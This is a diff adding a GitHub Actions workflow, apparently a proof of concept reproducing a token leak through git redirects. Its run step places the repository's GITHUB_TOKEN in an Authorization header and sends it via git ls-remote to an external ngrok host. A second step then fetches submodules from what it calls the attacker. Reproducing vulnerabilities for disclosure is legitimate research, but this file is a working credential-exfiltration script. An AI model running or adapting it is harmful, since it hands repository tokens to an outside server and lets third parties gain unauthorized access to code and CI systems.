@@ -1,0 +1,15 @@
+name: token-leak-repro
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Reproduce token leak via git redirect
+        env:
+          GH_TOK: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "=== STEP 1: git with extraHeader follows redirect and leaks token ==="
+          git -c http.extraHeader="Authorization: token $GH_TOK" ls-remote https://3732-105-101-85-53.ngrok-free.app/import-redirect 2>&1 || true
+          echo "=== STEP 2: actions/checkout submodule fetch from attacker ==="
+          git submodule update --init 2>&1 || true
